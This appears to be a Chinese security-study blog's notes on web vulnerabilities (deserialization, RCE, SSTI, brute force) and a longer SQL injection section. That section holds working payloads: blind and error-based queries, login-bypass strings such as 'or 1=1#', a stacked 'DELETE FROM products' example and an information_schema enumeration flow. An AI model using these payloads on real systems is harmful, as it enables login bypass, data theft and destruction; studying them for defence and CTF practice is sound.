<h4 id="3-防御-8"><a href="#3-防御-8" class="headerlink" title="3.防御"></a>3.防御</h4><p>①尽量不要使用命令执行函数。<br>②客户端<u><strong>提交的变量在进入执行命令函数前</strong></u>要做好<u><strong>过滤和检测</strong></u>。<br>③在<u><strong>使用动态函数之前</strong></u>，确保使用函数是<u><strong>指定的函数</strong></u>之一。<u><strong>【防止攻击者引入新函数（非网站使用的函数）执行攻击语句】</strong></u><br>④对<u><strong>php语言</strong></u>而言，<u><strong>不能完全控制的危险函数最好不要使用</strong></u>。</p>
<hr>
<h3 id="暴力破解篇"><a href="#暴力破解篇" class="headerlink" title="暴力破解篇"></a>暴力破解篇</h3><h4 id="1-暴力破解原理"><a href="#1-暴力破解原理" class="headerlink" title="1.暴力破解原理"></a>1.暴力破解原理</h4><p>由于服务器端没有做限制，导致攻击者可以通过暴力手段破解所需信息，如用户名、密码、验证码等。暴力破解需要一个强大的字典，如4位数字的验证码，那么暴力破解的范围就是0000~9999，<u><strong>暴力破解的关键在于字典的大小</strong></u>。</p>
<h4 id="2-危害-9"><a href="#2-危害-9" class="headerlink" title="2.危害"></a>2.危害</h4><p>①用户密码被重置。<br>②敏感目录、参数被枚举。<br>③用户订单被枚举。</p>
<h4 id="3-防御-9"><a href="#3-防御-9" class="headerlink" title="3.防御"></a>3.防御</h4><p>① 如果<u><strong>用户登录次数超过设置的阈值</strong></u>，则<u><strong>锁定账号</strong></u>。<br>② 如果<u><strong>某个IP登陆次数超过设置的阈值，则锁定IP</strong></u>。但<u><em><strong>存在一个问题</strong></em></u>，如果<u><strong>多个用户使用的是同一个IP，则会造成其他用户也不能登录。</strong></u></p>
<hr>
<h3 id="反序列化漏洞篇（PHP）"><a href="#反序列化漏洞篇（PHP）" class="headerlink" title="反序列化漏洞篇（PHP）"></a>反序列化漏洞篇（PHP）</h3><h4 id="1-反序列化漏洞原理"><a href="#1-反序列化漏洞原理" class="headerlink" title="1.反序列化漏洞原理"></a>1.反序列化漏洞原理</h4><p>PHP反序列化漏洞也叫PHP对象注入，是一个非常常见的漏洞，这种类型的漏洞虽然有些难以利用，但一旦利用成功就会造成非常危险的后果。</p>
<p>漏洞的形成的<u><strong>根本原因是程序没有对用户输入的反序列化字符串进行检测，导致反序列化过程可以被恶意控制，进而造成代码执行、getshell等一系列不可控的后果</strong></u>。反序列化漏洞并不是PHP特有，<u><strong>也存在于Java、Python等语言</strong></u>之中，但其原理基本相通。</p>
<p>PHP类都含有几个特定的元素: 类属性、类常量、类方法。每一个类至少都含有以上三个元素，而这三个元素也可以组成最基本的类。那么按照特定的格式将这三个元素表达出来就可以将一个完整的类表示出来并传递。</p>
<p><u>序列化就是将一个<strong>类</strong>压缩成一个字符串的方法</u></p>
<h4 id="2-危害-10"><a href="#2-危害-10" class="headerlink" title="2.危害"></a>2.危害</h4><p><u><strong>未对用户输入的序列化字符串进行检测</strong></u>，导致<u><strong>攻击者可以控制反序列化过程</strong></u>，从而<u><strong>导致代码执行，SQL注入，目录遍历等不可控后果</strong></u>。在反序列化的过程中自动触发了某些魔术方法。</p>
<h4 id="3-防御-10"><a href="#3-防御-10" class="headerlink" title="3.防御"></a>3.防御</h4><h5 id="1-签名与认证"><a href="#1-签名与认证" class="headerlink" title="1)签名与认证"></a>1)签名与认证</h5><p>如果序列化的内容没有用户可控参数，仅仅是服务端存储和应用，则可以通过签名认证，来避免应用接受黑客的异常输入。   </p>
<h5 id="2-限制序列化与反序列化的类"><a href="#2-限制序列化与反序列化的类" class="headerlink" title="2)限制序列化与反序列化的类"></a>2)限制序列化与反序列化的类</h5><p>增加一层序列化和反序列化接口类。这就相当于允许提供了一个白名单的过滤：只允许某些类可以被反序列化。只要你在反序列化的过程中，避免接受处理任何类型（包括类成员中的接口、泛型等），黑客其实很难控制应用反序列化过程中所使用的类，也就没有办法构造出调用链，自然也就很难利用反序列化漏洞了</p>
<h5 id="3-RASP检测"><a href="#3-RASP检测" class="headerlink" title="3)RASP检测"></a>3)RASP检测</h5><p>（Runtime Application Self-Protection，实时程序自我保护）。RASP 通过 hook 等方式，在这些关键函数（例如：序列化，反序列化)的调用中，增加一道规则的检测。这个规则会判断应用是否执行了非应用本身的逻辑，能够在不修改代码的情况下对反序列化漏洞攻击实现拦截.</p>
<h4 id="4-利用"><a href="#4-利用" class="headerlink" title="4.利用"></a>4.利用</h4><h5 id="1-wakeup-绕过"><a href="#1-wakeup-绕过" class="headerlink" title="1)__wakeup( )绕过"></a>1)__wakeup( )绕过</h5><p>(CVE-2016-7124)</p>
<p>反序列化时，如果表示对象属性个数的值大于真实的属性个数时就会跳过__wakeup( )的执行。</p>
<h5 id="2-注入对象构造方法"><a href="#2-注入对象构造方法" class="headerlink" title="2)注入对象构造方法"></a>2)注入对象构造方法</h5><p>当目标对象被private、protected修饰时的构造方法。</p>
<h5 id="3-Session反序列化漏洞"><a href="#3-Session反序列化漏洞" class="headerlink" title="3)Session反序列化漏洞"></a>3)Session反序列化漏洞</h5><p>PHP中的Session经序列化后存储，读取时再进行反序列化。</p>
<h5 id="4-PHAR利用"><a href="#4-PHAR利用" class="headerlink" title="4)PHAR利用"></a>4)PHAR利用</h5><p>PHAR (“Php ARchive”) 是PHP里类似于JAR的一种打包文件，在PHP 5.3 或更高版本中默认开启，这个特性使得 PHP也可以像 Java 一样方便地实现应用程序打包和组件化。一个应用程序可以打成一个 Phar 包，直接放到 PHP-FPM 中运行。</p>
<hr>
<h3 id="RCE漏洞篇"><a href="#RCE漏洞篇" class="headerlink" title="RCE漏洞篇"></a>RCE漏洞篇</h3><h4 id="1-RCE漏洞原理"><a href="#1-RCE漏洞原理" class="headerlink" title="1.RCE漏洞原理"></a>1.RCE漏洞原理</h4><p>一般出现这种漏洞，是因为应用系统<u><strong>从设计上需要给用户提供指定的远程命令操作的接口</strong></u>。比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上。一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 如果，设计者在完成该功能时，<u><strong>没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器</strong></u>。 现在很多的企业都开始实施自动化运维,大量的系统操作会通过”自动化运维平台”进行操作。在这种平台上往往会出现远程系统命令执行的漏洞。 远程代码执行 同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。 不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。 因此，如果需要给<u><strong>前端用户提供操作类的API接口（一般指应用程序的编程接口，主要目的是提供应用程序与开发人员以访问一组例程的能力，而又无需访问源码，或理解内部工作机制的细节），一定需要对接口输入的内容进行严格的判断</strong></u>，比如实施严格的白名单策略会是一个比较好的方法。</p>
<h4 id="2-危害-11"><a href="#2-危害-11" class="headerlink" title="2.危害"></a>2.危害</h4><p>RCE漏洞，可以让攻击者直接向后台服务器远程注入<u><strong>操作系统命令或者代码</strong></u>，从而控制后台系统。</p>
<h4 id="3-防御-11"><a href="#3-防御-11" class="headerlink" title="3.防御"></a>3.防御</h4><p>1)尽量不要使用命令执行函数。</p>
<p>2)不要让用户控制参数。</p>
<p>3)执行前做好检测和过滤。</p>
<hr>
<h3 id="SSTI漏洞篇"><a href="#SSTI漏洞篇" class="headerlink" title="SSTI漏洞篇"></a>SSTI漏洞篇</h3><h4 id="1-SSTI漏洞原理"><a href="#1-SSTI漏洞原理" class="headerlink" title="1.SSTI漏洞原理"></a>1.SSTI漏洞原理</h4><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3679#toc-0">推荐文章</a></p>
<p>SSTI是一种注入类的漏洞，其<u><strong>成因也可以类比SQL注入</strong></u>。<br>SQL注入是从用户获得一个输入，然后用后端脚本语言进行数据库查询，利用输入来拼接我们想要的SQL语句。SSTI也是获取一个输入，然后在后端的渲染处理上进行语句的拼接执行。但是和SQL注入不同的，</p>
<p>SSTI利用的是现有的网站模板引擎，主要针对Python、PHP、JAVA的一些网站处理框架，比如Python的<strong>jinja2、mako、tornado、Django</strong>，PHP的<strong>smarty twig</strong>，java的<strong>jade velocity</strong>。当这些框架对运用渲染函数生成html的时候，在过滤不严情况下，通过构造恶意输入数据，从而达到getshell或其他目的。</p>
<p><u><strong>一句话就是服务端在接收用户输入或用户可控参数后，未作处理或未进行严格过滤，直接嵌入模板渲染，导致执行恶意代码</strong></u>。</p>
<p><strong>模板注入</strong>涉及的是服务端Web应用使用模板引擎<strong>渲染用户请求的过程</strong>，<br> 服务端把<strong>用户输入的内容渲染成模板</strong>就可能造成SSTI(Server-Side Template Injection)</p>
<p>模板渲染接受的参数需要用两个大括号<code>&#123;  &#123;&#125;  &#125;</code>括起来</p>
<h4 id="2-危害-12"><a href="#2-危害-12" class="headerlink" title="2.危害"></a>2.危害</h4><p>攻击者在服务器输入语句，服务端将其<u><strong>作为Web应用模板内容的一部分</strong></u>，在进行<u><strong>目标编译渲染</strong></u>的过程中，<u><strong>进行了语句的拼接，执行了所插入的恶意内容</strong></u>，从而<u><strong>导致信息泄露、代码执行、GetShell等</strong></u>问题</p>
<h4 id="3-防御-12"><a href="#3-防御-12" class="headerlink" title="3.防御"></a>3.防御</h4><p>1）和其他的注入防御一样，<u><strong>绝对不要让用户对传入模板的内容或者模板本身进行控制</strong></u></p>
<p>2）<u><strong>减少或者放弃直接使用格式化字符串结合字符串拼接的模板渲染</strong></u>方式，<u><strong>使用正规的模板渲染方法</strong></u></p>
<h2 id="各漏洞知识记录笔记"><a href="#各漏洞知识记录笔记" class="headerlink" title="各漏洞知识记录笔记"></a>各漏洞知识记录笔记</h2><h3 id="一、sql"><a href="#一、sql" class="headerlink" title="一、sql"></a>一、sql</h3><h4 id="sql注入的分类"><a href="#sql注入的分类" class="headerlink" title="sql注入的分类"></a>sql注入的分类</h4><h5 id="①按照数据提交的方式来分类："><a href="#①按照数据提交的方式来分类：" class="headerlink" title="①按照数据提交的方式来分类："></a>①按照数据提交的方式来分类：</h5><p>  （1）GET 注入：提交数据的方式是 GET , 注入点的位置在 GET 参数部分。比如有这样的一个链接<code>http://xxx.com/news.php?id=1</code> , id 是注入点。</p>
<p>  （2）POST 注入：使用 POST 方式提交数据，注入点位置在 POST 数据部分，常发生在表单中(输入框)。</p>
<p>  （3）Cookie 注入：HTTP请求的时候会带上客户端的Cookie, 注入点在Cookie当中的某个字段中。</p>
<p>  （4）HTTP 头部注入：注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中。严格讲的话，Cookie 其实应该也是算头部注入的一种形式。因为在 HTTP 请求的时候，Cookie 是头部的一个字段。</p>
<h5 id="②按照执行效果来分类："><a href="#②按照执行效果来分类：" class="headerlink" title="②按照执行效果来分类："></a>②按照执行效果来分类：</h5><h6 id="（1）基于布尔的盲注："><a href="#（1）基于布尔的盲注：" class="headerlink" title="（1）基于布尔的盲注："></a>（1）基于布尔的盲注：</h6><p>即可以根据返回页面判断条件真假的注入。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">一般根据数据字符asiic码大小或字符长短，用二分法进行判断字符答案</span><br><span class="line"></span><br><span class="line">长度比如</span><br><span class="line"><span class="number">1</span> and <span class="built_in">length</span>(<span class="built_in">database</span>()) &gt; <span class="number">5</span></span><br><span class="line"><span class="comment">/*意思就是判断数据库名大于5，如果返回假就在小于5里找，如果返回真，就在大于5范围里找，猜测到大概的长度的时候，可以用=试试*/</span></span><br><span class="line"></span><br><span class="line">ascii比如</span><br><span class="line"><span class="number">1</span> and <span class="built_in">ascii</span>(<span class="built_in">substr</span>(<span class="built_in">database</span>(),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">110</span></span><br><span class="line"><span class="comment">//substr是截取字符，如上就是从第一个字符截取，截取一个字符</span></span><br><span class="line"><span class="comment">/*意思就是判断数据库名第一个字母的ascii码是否大于110，返回假就在小于110里找，返回真，就在大于110里找，最后可以用=加以确定*/</span></span><br></pre></td></tr></table></figure></div>

<p><code>可以用burpsuite进行payload爆破，用数字字典，直接从0-127（ascii码共127位），然后根据回显，判断，就不用一个一个慢慢尝试</code></p>
<p><code>强烈建议可以学习一下python，这样可以自己针对性的写一个脚本，效率更高</code></p>
<h6 id="（2）基于时间的盲注："><a href="#（2）基于时间的盲注：" class="headerlink" title="（2）基于时间的盲注："></a>（2）基于时间的盲注：</h6><p>即不能根据页面返回内容判断任何信息，用条件语句（if）查看时间延迟语句（sleep()）是否执行（即页面返回时间是否增加）来判断。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SCSS"><figure class="iseeu highlight /scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> and <span class="built_in">if</span>(length(database()&gt;<span class="number">7</span>,<span class="built_in">sleep</span>(<span class="number">5</span>),<span class="number">1</span>)</span><br><span class="line"><span class="comment">/*这里判断如果数据库名大于7，就延迟网页5s，反正没有延迟【就是执行1】，剩下的和bool盲注一样，挨个试试，推测出数据库名和其他数据*/</span></span><br></pre></td></tr></table></figure></div>

<h6 id="（3）基于报错注入："><a href="#（3）基于报错注入：" class="headerlink" title="（3）基于报错注入："></a>（3）基于报错注入：</h6><p>即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。如：单引号、双引号、基于数字型注入。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">比如查询数据库名</span><br><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(<span class="built_in">schema_name</span>) <span class="keyword">from</span> information_schema.schemata),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure></div>

<p> *<strong>注意</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SAS"><figure class="iseeu highlight /sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">extractvalue和updatexml只显示32位字符</span><br><span class="line"></span><br><span class="line">所以爆出字符不全时，可以用<span class="meta">left</span>(xxx,<span class="keyword">length</span>)和<span class="meta">right</span>(xxx,<span class="keyword">length</span>)</span><br><span class="line">【注意0x7e也就是~也算字符位，按上面例子用了两个~，所以这里最多只能<span class="keyword">select</span> 30个字符了，但左右都30，一共可以<span class="keyword">select</span> 60个字符】</span><br><span class="line"></span><br><span class="line">或者用<span class="meta">substr</span>(xxx,begin,<span class="keyword">length</span>)，从数据的某个开始【这里的开始位是从1开始，而不是0】截取一部分显示</span><br></pre></td></tr></table></figure></div>

<p>（4）联合查询注入：可以使用union的情况下的注入。</p>
<p>（5）堆查询注入（堆叠注入）：可以同时执行多条语句的执行时的注入。</p>
<p>（6）宽字节注入：</p>
<h5 id="③按照注入点类型来分类："><a href="#③按照注入点类型来分类：" class="headerlink" title="③按照注入点类型来分类："></a>③按照注入点类型来分类：</h5><p>  （1）数字型注入点：许多网页链接有类似的结构 <a target="_blank" rel="noopener" href="http://xxx.com/users.php?id=1">http://xxx.com/users.php?id=1</a> 基于此种形式的注入，其注入点 id 类型为数字若存在注入点，则可以利用网页通过此种结构传递id等信息的原理，构造出类似如下的sql注入语句进行爆破：select * from 表名 where id=1 and 1=1</p>
<p>  （2）字符型注入点：网页链接有类似的结构 <a target="_blank" rel="noopener" href="http://xxx.com/users.php?name=admin">http://xxx.com/users.php?name=admin</a> 这种形式，其注入点 name 类型为字符类型，若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：select * from 表名 where name=‘admin’ and 1=1 ’</p>
<p>  （3）搜索型注入点：这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有 “keyword=关键字” 有的不显示在的链接地址里面，而是直接通过搜索框表单提交。此类注入点提交的 SQL 语句，其原形大致为：select * from 表名 where 字段 like ‘%关键字%’ 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：select * from 表名 where 字段 like ‘%测试%’ and ‘%1%’=’%1%’</p>
<h5 id="④基于程度和顺序的注入-哪里发生了影响"><a href="#④基于程度和顺序的注入-哪里发生了影响" class="headerlink" title="④基于程度和顺序的注入(哪里发生了影响)"></a>④基于程度和顺序的注入(哪里发生了影响)</h5><p>★一阶注射 </p>
<p>★二阶注射 </p>
<p>一阶注射是指输入的注射语句对 WEB 直接产生了影响，出现了结果；</p>
<p>二阶注入<strong>类似存储型 XSS</strong>，是指输入提交的语句，无法直接对 WEB 应用程序产生影响，通过其它的辅助间接的对 WEB 产生危害，这样的就被称为是二阶注入. </p>
<h4 id="1-堆叠注入"><a href="#1-堆叠注入" class="headerlink" title="1.堆叠注入"></a>1.堆叠注入</h4><h5 id="1-堆叠注入定义"><a href="#1-堆叠注入定义" class="headerlink" title="1.堆叠注入定义"></a>1.堆叠注入定义</h5><p>   Stacked  injections(堆叠注入)从名词的含义就可以看到应该是一堆 sql 语句(多条)一起执行。而在真实的运用中也是这样的, 我们知道在  mysql 中, 主要是命令行中, 每一条语句结尾加; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做 stacked  injection。</p>
<h5 id="2-堆叠注入原理"><a href="#2-堆叠注入原理" class="headerlink" title="2.堆叠注入原理"></a>2.堆叠注入原理</h5><p>   在SQL中，分号（;）是用来表示一条sql语句的结束。<u>试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入</u>。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于<u>union 或者union all执行的语句类型是有限的，可以用来执行查询语句</u>，而<u>堆叠注入可以执行的是任意的语句</u>。例如以下这个例子。用户输入：<code>1; DELETE FROM products</code>服务器端生成的sql语句为：  <code>Select * from products where productid=1;DELETE FROM products</code>当执行查询后，<u><strong>第一条显示查询信息</strong></u>，<u><strong>第二条则将整个表进行删除</strong></u>。</p>
<h5 id="3-堆叠注入的局限性"><a href="#3-堆叠注入的局限性" class="headerlink" title="3.堆叠注入的局限性"></a>3.堆叠注入的局限性</h5><p>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。</p>
<p><strong>下面我以一道题为例解析堆叠注入，该题来自于<a href="../../../../2022/06/21/buuctf-wp"> buuctf的[强网杯 2019]随便注 </a></strong></p>
<h4 id="2-无列名注入"><a href="#2-无列名注入" class="headerlink" title="2.无列名注入"></a>2.<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Lee-404/p/12833788.html">无列名注入</a></h4><p>上面链接是一篇大佬讲解的无列名注入，之前刷攻防世界遇到类似的题目，看了这篇文章学到了新技巧</p>
<h4 id="3-联合注入"><a href="#3-联合注入" class="headerlink" title="*3.联合注入"></a>*3.联合注入</h4><p><strong>联合注入有个技巧。在联合查询并不存在的数据时，联合查询就会构造一个 虚拟的数据</strong></p>
<p>举个例子：<br>最初users表中只有一行数据，</p>
<p><img src="/2022/05/28/Web-study/image-20220909230928678.png" alt="image-20220909230928678"></p>
<p><strong>我们通过<code>union select</code>查询就可以构造一行虚拟的数据，</strong></p>
<p><img src="/2022/05/28/Web-study/image-20220909231009396.png" alt="image-20220909231009396"></p>
<p>这样，我们在users表中利用联合查询创建了一行虚拟的数据。</p>
<hr>
<h4 id="1-几个常用函数"><a href="#1-几个常用函数" class="headerlink" title="1.几个常用函数"></a>1.几个常用函数</h4><p>1.<code>version()</code>——MySQL 版本 </p>
<p>2.<code>user()</code>——数据库用户名 </p>
<p>3.<code>database()</code>——数据库名 </p>
<p>4.<code>@@datadir</code>——数据库路径 </p>
<p>5.<code>@@version_compile_os</code>——操作系统版本</p>
<h4 id="2-一般用于尝试的闭合语句"><a href="#2-一般用于尝试的闭合语句" class="headerlink" title="2.一般用于尝试的闭合语句"></a>2.一般用于尝试的<u>闭合语句</u></h4><p>Ps:<strong>–+可以用#替换，url 提交过程中 Url 编码后的#为%23，–+和#为注释符，把后面语句注释掉，使其无法执行</strong></p>
<p><code>or 1=1--+</code> </p>
<p><code>&#39;or 1=1--+</code> </p>
<p><code>&quot;or 1=1--+</code> </p>
<p><code>)or 1=1--+</code> </p>
<p><code>&#39;)or 1=1--+</code> </p>
<p><code>&quot;) or 1=1--+</code> </p>
<p><code>&quot;))or 1=1--+</code></p>
<h4 id="3-sql中逻辑运算【万能密码的原理】"><a href="#3-sql中逻辑运算【万能密码的原理】" class="headerlink" title="3.sql中逻辑运算【万能密码的原理】"></a>3.sql中逻辑运算【万能密码的原理】</h4><p>提出一个问题 <code>Select * from users where id=1 and 1=1</code>;这条语句为什么能够选择出 id=1 的内容，and 1=1 到底起作用了没有？这里就要清楚 sql 语句执行顺序了。 同时这个问题我们在使用万能密码的时候会用到。</p>
<p><code>Select * from admin where username=’admin’ and password=’admin’</code> </p>
<p>我们可以用 <code>’or 1=1#</code> 作为密码输入。原因是为什么？ </p>
<p>这里涉及到一个逻辑运算，当使用上述所谓的万能密码后，构成的 sql 语句为： </p>
<p><code>Select * from admin where username=’admin’ and password=’’or 1=1#’</code> </p>
<p>Explain:上面的这个语句执行后，我们在不知道密码的情况下就登录到了 admin 用户了。原 因 是 在 where 子 句 后 ， 我 们 可 以 看 到 三 个 条 件 语 句 <code>username=’admin’ and password=’’or 1=1</code>。三个条件用 and 和 or 进行连接。在 sql 中，我们 <u><strong>and 的运算优先级大于 or 的元算优先级</strong></u>。因此可以看到 <u><strong>第一个条件（用 a 表示）是真的，第二个条件（用 b 表示）是假的，a and b = false</strong></u>,第一个条件和第二个条件执行 and 后是假，再与<u><strong>第三 个条件 or 运算，因为第三个条件 1=1 是恒成立的，所以结果自然就为真了</strong></u>。因此上述的语 句就是恒真了</p>
<p>ps 逻辑语句的区别</p>
<p>1.and:两个或多个条件同时满足，才为真（显示一条数据）</p>
<p>2.or:两个或多个条件满足其中一个即为真（显示一条数据）</p>
<p>使用and语句注意<code>select * from test where a = 1 and a = 2</code>这样操作肯定不行，<u><strong>后面的一个值会把前面的值给覆盖掉</strong></u>，最后执行的是<code>select * from test where a = 2</code></p>
<p>而用or语句的话<code>select * from test where a = 1 or a = 2</code>,执行<code>select * from test where a = 1</code>,若<code>a=1</code>为假，则执行<code>select * from test where a = 2</code></p>
<p>3.union:联合查询，将<u><strong>多个查询结果合并（如果有一个结果为空，不影响其他结果合并）</strong></u>起来时，<u><strong>系统会自动去掉重复元组</strong></u></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id<span class="operator">=</span> <span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>,<span class="number">3</span><span class="comment">--+</span></span><br><span class="line"><span class="comment">/*这里注意，如果id=1，那么结果合并时，就会覆盖后面的结果，所以这里需要前面的语句返回为空，那么后面的数据就会显现出来*/</span></span><br></pre></td></tr></table></figure></div>

<p>请注意，UNION 内部的 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的列的顺序必须相同。 </p>
<h4 id="4-注入的一般流程【按顺序查询注入】"><a href="#4-注入的一般流程【按顺序查询注入】" class="headerlink" title="4.注入的一般流程【按顺序查询注入】"></a>4.注入的一般流程【按顺序查询注入】</h4><h5 id="ps-关键记忆和使用"><a href="#ps-关键记忆和使用" class="headerlink" title="ps.关键记忆和使用"></a>ps.关键记忆和使用</h5><p><code>schema_name</code> 数据库名</p>
<p><code>information_schema.schemata</code> 全部数据库</p>
<p><code>table_name</code> 表名</p>
<p><code>information_schema.tables</code> 全部表</p>
<p><code>table_schema=’xxxxx’</code> ‘xxxx’为目标表所在的数据库名</p>
<p><code>column_name</code> 列名</p>
<p><code>information_schema.columns</code> 全部列名</p>
<p><code>table_name=’xxxxx’</code> ‘xxxx’想要查询数据所在的表名</p>
<h5 id="1-注入语句"><a href="#1-注入语句" class="headerlink" title="[1] 注入语句"></a>[1] 注入语句</h5><p>1）猜数据库 【以下语句功能，显示该数据库内所有数据库的名字】</p>
<p><code>select schema_name from information_schema.schemata</code> </p>
<p>2）猜某库的数据表 【以下语句功能，显示该数据库内所有数据库的名字】</p>
<p><code>select table_name from information_schema.tables where table_schema=’xxxxx’</code> </p>
<p>3）猜某表的所有列【以下语句功能，显示该数据库内所有数据库的名字】</p>
<p><code>Select column_name from information_schema.columns where table_name=’xxxxx’</code> </p>
<p>4）获取某列的内容 【以下语句功能，显示该列】</p>
<p><code>Select 该列的目标数据分类的名称  from   列名</code></p>
<h5 id="2-注入流程图"><a href="#2-注入流程图" class="headerlink" title="[2] 注入流程图"></a>[2] 注入流程图</h5><p><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg-blog.csdnimg.cn%2F20201009142512180.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xhZHlfa2lsbGVyOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70&refer=http%3A%2F%2Fimg-blog.csdnimg.cn&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=auto?sec=1656476375&t=82f2380c052f036e8454035070bc6a42" alt="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg-blog.csdnimg.cn%2F20201009142512180.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xhZHlfa2lsbGVyOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70&amp;refer=http%3A%2F%2Fimg-blog.csdnimg.cn&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=auto?sec=1656476375&amp;t=82f2380c052f036e8454035070bc6a42"></p>
<h4 id="5-mysql错误分析解决"><a href="#5-mysql错误分析解决" class="headerlink" title="5.mysql错误分析解决"></a>5.mysql错误分析解决</h4><h5 id="1）子查询结果多于一行"><a href="#1）子查询结果多于一行" class="headerlink" title="1）子查询结果多于一行"></a>1）子查询结果多于一行</h5><p><code>Subquery returns more than 1 row</code></p>
<p>以<code>select * from table1 where table1.colums=(select columns from table2)</code>这个sql语句为例</p>
<p>1.如果是写入重复，去掉重复数据。然后写入的时候，可以加逻辑判断(php)或者外键(mysql)，防止数据重复写入。（但在实际开发中可能需要重复写入，所以需要慎重考虑）</p>
<p>2.在子查询条件语句加<code>limit 1</code>,找到一个符合条件的就可以了<br><code>select * from table1 where table1.colums in (select columns from table2 limit 1)</code> </p>
<p>如果需要继续向后查询，可以用<code>limit 0,1</code>   <code>limit 1,1</code>   <code>limit 2,1</code>   …..  <code>limit n,1</code></p>
<p>3.在子查询前加any关键字<br><code>select * from table1 where table1.colums=any(select columns from table2)</code></p>
<h5 id="ps-子查询语句"><a href="#ps-子查询语句" class="headerlink" title="ps. 子查询语句"></a>ps. 子查询语句</h5><p><strong>子查询</strong>是指在<strong>一个select语句中嵌套另一个slecet语句</strong>。</p>
<p><strong>any、in、some、all</strong>分别是子查询关键词之一。</p>
<p><strong>any</strong>可以与=、&gt;、&gt;=、&lt;、&lt;=、&lt;&gt;结合起来使用，分别表示等于、大于、大于等于、小于、小于等于、不等于其中的任何一个数据。</p>
<p>all可以与=、&gt;、&gt;=、&lt;、&lt;=、&lt;&gt;结合是来使用，分别表示等于、大于、大于等于、小于、小于等于、不等于其中的其中的所有数据。</p>
<p>他们进行子查询的语法如下：</p>
<p><code>operand comparison_operator any(subquery);</code><br><code>operand in (subquery);</code><br><code>operand coparison_operator some(subquery);</code><br><code>operand coparison_operator all (subquery);</code></p>
<p><strong>any,all关键词必须与一个比较操作符一起使用</strong></p>
<p>any关键词可以理解为<strong>对于子查询返回的列中的<u>任意</u>数值，如果比较结果为ture，则返回true</strong><br>例如：</p>
<p><code>select s1 from t1 where s1 &gt; any (select s1 from t2)</code></p>
<p>假设表t1中有一行包含（10） ， t2包含（20,12,5），则表达式为true；如果t2包含（20,10），或者表t2位空表，则表达式为false。如果t2包含（null，null），则表达式为unkonwn。</p>
<p>all关键词<strong>对于子查询返回的列中的<u>所有值</u>，如果比较结果为true，则返回true</strong><br>例如：</p>
<p><code>select s1 from t1 where s1&gt; all (select s1 from s2)</code></p>
